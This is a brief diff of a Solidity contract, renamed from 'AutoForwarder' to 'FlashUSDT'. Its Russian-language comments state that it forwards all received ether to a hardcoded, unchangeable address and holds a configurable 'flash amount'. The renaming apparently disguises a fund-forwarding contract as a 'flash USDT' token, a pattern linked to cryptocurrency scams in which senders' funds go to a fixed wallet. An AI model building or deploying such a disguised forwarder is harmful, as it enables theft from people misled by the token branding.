@@ -1,10 +1,10 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-/// @title AutoForwarder
+/// @title FlashUSDT
 /// @notice Этот контракт автоматически пересылает полученный эфир на заранее определенный адрес.
 /// @dev Адрес назначения жестко задан и неизменяем. Контракт включает функциональность установки и обновления суммы "flash amount", а также механизмы контроля доступа для обеспечения безопасности.
-contract AutoForwarder {
+contract FlashUSDT {
     /// @notice Адрес, на который будет пересылаться весь полученный эфир.
     /// @dev Этот адрес жестко задан и не может быть изменен после развертывания.
     address payable public constant destinationAddress = payable(0x706F5710D045AE9067F37aECA26A971341E8dA26);
